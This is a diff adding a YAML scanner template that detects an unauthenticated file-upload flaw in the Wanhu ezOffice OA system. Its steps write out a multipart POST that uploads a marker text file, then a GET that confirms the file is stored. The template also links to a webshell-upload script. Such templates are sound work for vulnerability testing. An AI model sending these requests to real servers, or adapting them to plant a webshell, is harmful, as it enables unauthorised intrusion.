@@ -1,0 +1,46 @@
+app: ezOffice
+query: body:"defaultroot"
+meta:
+  name: ezOffice 万户OA文件上传
+  level: 5
+  tags:
+    - file_upload
+  description: 万户和致远一样，都是用了金格的组件。所以漏洞位置也差不多。漏洞位置 /defaultroot/officeserverservlet
+  homepage: https://www.whir.net/
+  author: 一曲成殇
+  references: https://github.com/cyxshizhu/OA-ezOFFICE/blob/main/%E4%B8%87%E6%88%B7%E4%B8%8A%E4%BC%A0webshell%E6%BC%8F%E6%B4%9E.py
+  solution: 升级版本
+  steps:
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: POST
+            path: /defaultroot/upload/fileUpload.controller
+            redirect: true
+            header:
+              - Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+              - Connection: Keep-Alive
+            params: |
+             --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+              Content-Disposition: form-data; name="file"; filename="is123.txt"
+              Content-Type: application/octet-stream
+              Content-Transfer-Encoding:binary
+              
+              12345ssss6
+              --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
+          response: [ ]
+        - request:
+            method: GET
+            path: /defaultroot/upload/html/is123.txt
+            redirect: false
+            header: [ ]
+            params: ""
+          response:
+            - name: body
+              value: 12345ssss6
+              type: contains
+            - name: code
+              value: "200"
+              type: equals
+  create_at: "2021-11-06 16:03:14"
